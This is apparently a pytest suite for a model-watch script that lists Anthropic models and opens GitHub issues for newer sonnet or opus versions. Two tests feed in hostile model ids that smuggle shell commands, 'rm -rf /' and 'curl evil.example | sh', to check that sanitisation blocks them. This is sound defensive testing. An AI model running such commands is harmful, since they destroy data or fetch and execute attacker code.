"""Tests for scripts/model_watch.py (see .github/workflows/model-watch.yml)."""

from __future__ import annotations

import http.client
import importlib.util
import json
import subprocess
import sys
from collections.abc import Mapping, Sequence
from pathlib import Path
from types import ModuleType
from typing import Any

import pytest

_SCRIPT = Path(__file__).resolve().parents[2] / "scripts" / "model_watch.py"


def _load() -> ModuleType:
    spec = importlib.util.spec_from_file_location("model_watch", _SCRIPT)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    # A @dataclass under `from __future__ import annotations` looks its own module up in
    # sys.modules, so it must be registered before the module body runs.
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


mw = _load()

_DEFAULTS = ("claude-sonnet-5-5", "claude-opus-5-5")
_ENV = {"ANTHROPIC_API_KEY": "test-key-not-real", "GITHUB_SERVER_URL": "https://github.com",
        "GITHUB_REPOSITORY": "o/r", "GITHUB_RUN_ID": "42"}


def _fetch_of(ids: Sequence[str], *, include_pinned: bool = True) -> Any:
    """A fake Models API listing. The watcher fails when a pinned default is missing from
    the listing, so it is included unless a test says otherwise."""
    listing = list(ids) + (list(_DEFAULTS) if include_pinned else [])

    def fetch(url: str, key: str) -> Mapping[str, Any]:
        return {"data": [{"id": i} for i in listing], "has_more": False}

    return fetch


class _Gh:
    """Records gh calls. `existing` are titles the issue search reports."""

    def __init__(self, existing: Sequence[str] = ()) -> None:
        self.calls: list[list[str]] = []
        self.existing = list(existing)

    def __call__(self, cmd: Sequence[str]) -> subprocess.CompletedProcess[str]:
        self.calls.append(list(cmd))
        if cmd[:3] == ["gh", "issue", "list"]:
            out = json.dumps([{"title": t} for t in self.existing])
            return subprocess.CompletedProcess(list(cmd), 0, out, "")
        return subprocess.CompletedProcess(list(cmd), 0, "https://example/issues/1\n", "")

    def created(self) -> list[list[str]]:
        return [c for c in self.calls if c[:3] == ["gh", "issue", "create"]]


@pytest.mark.parametrize(
    ("model_id", "expected"),
    [
        ("claude-sonnet-5-5", ("sonnet", (5, 5))),
        ("claude-sonnet-5", ("sonnet", (5, 0))),
        ("claude-opus-4-8", ("opus", (4, 8))),
        ("us.anthropic.claude-sonnet-5-5", ("sonnet", (5, 5))),
        ("global.anthropic.claude-opus-4-7", ("opus", (4, 7))),
        ("claude-sonnet-5-20260601", ("sonnet", (5, 0))),
        ("claude-sonnet-4-5-20250929", ("sonnet", (4, 5))),
    ],
)
def test_parse_model(model_id: str, expected: tuple[str, tuple[int, int]]) -> None:
    parsed = mw.parse_model(model_id)
    assert (parsed.family, parsed.version) == expected


@pytest.mark.parametrize(
    "model_id", ["claude-fable-5-1", "claude-haiku-4-5", "gpt-5.4", "claude-3-5-sonnet-20241022", ""]
)
def test_parse_model_ignores_other_families(model_id: str) -> None:
    assert mw.parse_model(model_id) is None


def test_only_newer_models_of_the_same_family_are_reported() -> None:
    listed = [
        "claude-sonnet-5", "claude-sonnet-5-5", "claude-sonnet-5-6", "claude-sonnet-6",
        "claude-opus-5-5", "claude-opus-6", "claude-fable-5-1", "claude-haiku-4-5",
    ]
    assert mw.newer_models("claude-sonnet-5-5", listed) == ["claude-sonnet-6", "claude-sonnet-5-6"]
    assert mw.newer_models("claude-opus-5-5", listed) == ["claude-opus-6"]


def test_equal_or_older_and_dated_duplicates_of_the_pinned_version_are_not_newer() -> None:
    listed = ["claude-sonnet-5-5", "claude-sonnet-5-5-20260901", "claude-sonnet-5", "claude-sonnet-4-6"]
    assert mw.newer_models("claude-sonnet-5-5", listed) == []


def test_one_id_per_version_preferring_the_undated_alias() -> None:
    listed = ["claude-sonnet-5-6-20261001", "claude-sonnet-5-6"]
    assert mw.newer_models("claude-sonnet-5-5", listed) == ["claude-sonnet-5-6"]


def test_ids_with_unsafe_characters_are_ignored() -> None:
    listed = ['claude-sonnet-6"; rm -rf /', "claude-sonnet-6\nInjected: yes", "CLAUDE-SONNET-6"]
    assert mw.newer_models("claude-sonnet-5-5", listed) == []


def test_unparseable_pinned_default_is_an_error() -> None:
    with pytest.raises(mw.WatchError):
        mw.newer_models("gpt-5.4", ["claude-sonnet-6"])


def test_list_model_ids_follows_pagination() -> None:
    pages = {
        "": {"data": [{"id": "a"}, {"id": "b"}], "has_more": True, "last_id": "b"},
        "b": {"data": [{"id": "c"}], "has_more": False},
    }
    seen: list[str] = []

    def fetch(url: str, key: str) -> Mapping[str, Any]:
        seen.append(url)
        return pages["b" if "after_id=b" in url else ""]

    assert mw.list_model_ids("k", fetch) == ["a", "b", "c"]
    assert "after_id=b" in seen[1]


def test_list_model_ids_never_returns_a_partial_list() -> None:
    def no_last_id(url: str, key: str) -> Mapping[str, Any]:
        return {"data": [{"id": "a"}], "has_more": True}

    with pytest.raises(mw.WatchError):
        mw.list_model_ids("k", no_last_id)

    def endless(url: str, key: str) -> Mapping[str, Any]:
        return {"data": [{"id": "a"}], "has_more": True, "last_id": "a"}

    with pytest.raises(mw.WatchError):
        mw.list_model_ids("k", endless)


def test_no_api_key_exits_2_and_does_nothing() -> None:
    gh = _Gh()
    assert mw.main([], fetch=_fetch_of([]), run=gh, env={}, defaults=_DEFAULTS) == 2
    assert gh.calls == []


def test_up_to_date_opens_nothing(capsys: pytest.CaptureFixture[str]) -> None:
    gh = _Gh()
    listed = ["claude-sonnet-5-5", "claude-opus-5-5", "claude-fable-5-1"]
    assert mw.main([], fetch=_fetch_of(listed), run=gh, env=_ENV, defaults=_DEFAULTS) == 0
    assert gh.calls == []
    assert "newest sonnet listed" in capsys.readouterr().out


def test_newer_model_opens_one_issue() -> None:
    gh = _Gh()
    listed = ["claude-sonnet-5-5", "claude-sonnet-5-6", "claude-opus-5-5"]
    assert mw.main([], fetch=_fetch_of(listed), run=gh, env=_ENV, defaults=_DEFAULTS) == 0
    created = gh.created()
    assert len(created) == 1
    assert "New Anthropic standard model available: claude-sonnet-5-6" in created[0]


def test_both_families_can_open_their_own_issue() -> None:
    gh = _Gh()
    listed = ["claude-sonnet-5-6", "claude-opus-6"]
    mw.main([], fetch=_fetch_of(listed), run=gh, env=_ENV, defaults=_DEFAULTS)
    titles = [c[c.index("--title") + 1] for c in gh.created()]
    assert titles == [
        "New Anthropic standard model available: claude-sonnet-5-6",
        "New Anthropic premium model available: claude-opus-6",
    ]


def test_an_existing_issue_with_the_same_title_is_not_duplicated() -> None:
    gh = _Gh(existing=["New Anthropic standard model available: claude-sonnet-5-6"])
    mw.main([], fetch=_fetch_of(["claude-sonnet-5-6"]), run=gh, env=_ENV, defaults=_DEFAULTS)
    assert gh.created() == []


def test_a_similar_title_does_not_count_as_already_reported() -> None:
    gh = _Gh(existing=["New Anthropic standard model available: claude-sonnet-5-60"])
    mw.main([], fetch=_fetch_of(["claude-sonnet-5-6"]), run=gh, env=_ENV, defaults=_DEFAULTS)
    assert len(gh.created()) == 1


def test_dry_run_opens_nothing(capsys: pytest.CaptureFixture[str]) -> None:
    gh = _Gh()
    code = mw.main(["--dry-run"], fetch=_fetch_of(["claude-sonnet-5-6"]), run=gh, env=_ENV,
                   defaults=_DEFAULTS)
    assert code == 0
    assert gh.calls == []
    assert "dry run, would open" in capsys.readouterr().out


def test_api_failure_exits_1_without_leaking_the_key(capsys: pytest.CaptureFixture[str]) -> None:
    def boom(url: str, key: str) -> Mapping[str, Any]:
        raise mw.WatchError("Models API request failed: HTTP 401")

    gh = _Gh()
    assert mw.main([], fetch=boom, run=gh, env=_ENV, defaults=_DEFAULTS) == 1
    captured = capsys.readouterr()
    assert "test-key-not-real" not in captured.out + captured.err
    assert gh.calls == []


def test_a_hostile_model_id_from_the_api_never_reaches_gh() -> None:
    gh = _Gh()
    hostile = 'claude-sonnet-9"; curl evil.example | sh #'
    mw.main([], fetch=_fetch_of([hostile]), run=gh, env=_ENV, defaults=_DEFAULTS)
    assert gh.calls == []


def test_issue_body_is_a_plain_checklist_with_the_override_and_no_em_dash() -> None:
    body = mw.issue_body("standard", "claude-sonnet-5-5", "claude-sonnet-5-6", "https://x/run/1")
    assert "claude-sonnet-5-5" in body and "claude-sonnet-5-6" in body
    assert "AI_MODEL_STANDARD" in body
    assert "Nothing has changed" in body
    assert body.count("- [ ]") >= 5
    assert chr(0x2014) not in body
    premium = mw.issue_body("premium", "claude-opus-5-5", "claude-opus-6", "")
    assert "AI_MODEL_PREMIUM" in premium
    assert "Opened by the model watcher" not in premium


def test_the_repos_real_defaults_are_readable_by_the_watcher() -> None:
    """If a default is renamed to something the watcher cannot read, this fails here
    and not silently on a Monday."""
    standard, premium = mw.pinned_defaults()
    assert mw.parse_model(standard).family == "sonnet"
    assert mw.parse_model(premium).family == "opus"


class _Server:
    """A local HTTP server that replays scripted (status, body) responses and records
    the request headers, to exercise the real urllib path without touching the network."""

    def __init__(self, responses: Sequence[tuple[int, str]]) -> None:
        import http.server
        import threading

        outer = self
        self.headers: list[dict[str, str]] = []
        self._responses = list(responses)

        class Handler(http.server.BaseHTTPRequestHandler):
            def do_GET(self) -> None:  # noqa: N802
                outer.headers.append({k.lower(): v for k, v in self.headers.items()})
                status, body = outer._responses.pop(0)
                self.send_response(status)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(body.encode())

            def log_message(self, *args: object) -> None:
                pass

        self._server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        self.url = f"http://127.0.0.1:{self._server.server_address[1]}/v1/models"
        self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
        self._thread.start()

    def close(self) -> None:
        self._server.shutdown()
        self._server.server_close()


def test_http_get_sends_the_key_and_version_headers(monkeypatch: pytest.MonkeyPatch) -> None:
    server = _Server([(200, json.dumps({"data": [{"id": "claude-sonnet-5-5"}], "has_more": False}))])
    try:
        monkeypatch.setattr(mw, "API_URL", server.url)
        assert mw.list_model_ids("secret-key-123") == ["claude-sonnet-5-5"]
    finally:
        server.close()
    assert server.headers[0]["x-api-key"] == "secret-key-123"
    assert server.headers[0]["anthropic-version"] == mw.API_VERSION


def test_http_get_does_not_retry_a_401_and_never_leaks_the_key(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    server = _Server([(401, "{}")])
    try:
        monkeypatch.setattr(mw, "API_URL", server.url)
        with pytest.raises(mw.WatchError) as excinfo:
            mw.list_model_ids("secret-key-123")
    finally:
        server.close()
    assert "401" in str(excinfo.value)
    assert "secret-key-123" not in str(excinfo.value)
    assert len(server.headers) == 1


def test_http_get_retries_a_transient_503(monkeypatch: pytest.MonkeyPatch) -> None:
    server = _Server([(503, "{}"), (200, json.dumps({"data": [{"id": "x"}], "has_more": False}))])
    try:
        monkeypatch.setattr(mw, "API_URL", server.url)
        monkeypatch.setattr(mw.time, "sleep", lambda _s: None)
        assert mw.list_model_ids("k") == ["x"]
    finally:
        server.close()
    assert len(server.headers) == 2


def test_the_duplicate_search_includes_closed_issues() -> None:
    """A model someone decided not to adopt (issue closed) must not be reported again,
    so the search has to look at closed issues too, not only open ones."""
    gh = _Gh()
    mw.main([], fetch=_fetch_of(["claude-sonnet-5-6"]), run=gh, env=_ENV, defaults=_DEFAULTS)
    search = next(c for c in gh.calls if c[:3] == ["gh", "issue", "list"])
    assert search[search.index("--state") + 1] == "all"


def test_a_response_without_a_data_list_is_an_error_not_zero_models() -> None:
    for broken in ({}, {"error": {"type": "api_error"}}, {"data": None}, {"data": "nope"}):
        with pytest.raises(mw.WatchError):
            mw.list_model_ids("k", lambda url, key, page=broken: page)


@pytest.mark.parametrize("ids", [[], ["claude-sonnet-5-6"], ["claude-opus-5-5"]])
def test_an_empty_listing_or_a_missing_pinned_default_fails_loudly(
    ids: list[str], capsys: pytest.CaptureFixture[str]
) -> None:
    """Never a green "nothing newer" when the listing is empty or lacks a pinned default."""
    gh = _Gh()
    code = mw.main(
        [], fetch=_fetch_of(ids, include_pinned=False), run=gh, env=_ENV, defaults=_DEFAULTS
    )
    assert code == 1
    assert gh.calls == []
    assert "model watch failed" in capsys.readouterr().err


@pytest.mark.parametrize("model_id", ["claude-sonnet-6\n", "claude-sonnet-6\r\n", "claude-sonnet-6 "])
def test_an_id_with_trailing_whitespace_is_ignored(model_id: str) -> None:
    """`$` matches before a trailing newline, so the safe-id check must be a full match."""
    assert mw.newer_models("claude-sonnet-5-5", [model_id]) == []
    assert mw.parse_model("claude-sonnet-6\n") is None


@pytest.mark.parametrize(
    "error",
    [
        ConnectionResetError("reset"),
        http.client.IncompleteRead(b"partial"),
        UnicodeDecodeError("utf-8", b"\xff", 0, 1, "bad"),
        TimeoutError("slow"),
    ],
)
def test_network_and_decoding_failures_retry_then_fail_cleanly(
    monkeypatch: pytest.MonkeyPatch, error: Exception
) -> None:
    calls: list[int] = []

    def boom(request: object, timeout: int = 0) -> None:
        calls.append(1)
        raise error

    monkeypatch.setattr(mw.urllib.request, "urlopen", boom)
    monkeypatch.setattr(mw.time, "sleep", lambda _s: None)
    with pytest.raises(mw.WatchError) as excinfo:
        mw.list_model_ids("secret-key-123")
    assert len(calls) == mw.HTTP_ATTEMPTS
    assert "secret-key-123" not in str(excinfo.value)
